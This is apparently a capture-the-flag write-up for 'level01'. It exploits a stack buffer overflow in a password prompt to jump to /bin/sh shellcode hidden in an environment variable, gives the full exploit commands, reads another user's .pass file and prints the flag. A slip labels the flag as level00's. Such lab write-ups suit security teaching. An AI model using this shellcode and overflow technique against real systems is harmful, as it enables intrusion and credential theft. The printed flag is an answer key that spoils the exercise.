# level01

The executable prompts for a username and a password. A wrong username kicks us out, but no matter the password, nothing interesting happens.

We want to input the correct password, and then exploit the password prompt to overwrite `eip` and point to a shellcode. We'll store the shellcode in an env variable.

## **The shellcode**

We reuse our trusty shellcode and check it in `GDB` with :

```
env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb level01
```

Our nopesled spans from `0xffffddae` to `0xffffdfae`, so we target the middle `0xffffdeae`.

## **The address**

First, we must pass the correct username (`dat_wil`) to the executable by passing `echo "dat_wil"` to `stdin`.

Now, we can look for `eip` in GDB. Simply enough, we find we can overwrite the register with `84 bytes`. Our "password" will be `80 bytes` of garbage, and `4 bytes` for the address of our nopesled, `0xffffdeae`.

## **The command**

We must pass the correct username (`dat_wil`) to the executable before spoofing `eip`.

Stringing everything together we try the following command :

```
( echo "dat_wil" ; python -c 'print("A" * 80 + "\xae\xde\xff\xff")' ; cat ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level01
```

## **The flag**

It works ! In the interactive shell, we run :

```
cat /home/users/level02/.pass
```

We get the flag for `level00` :

```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```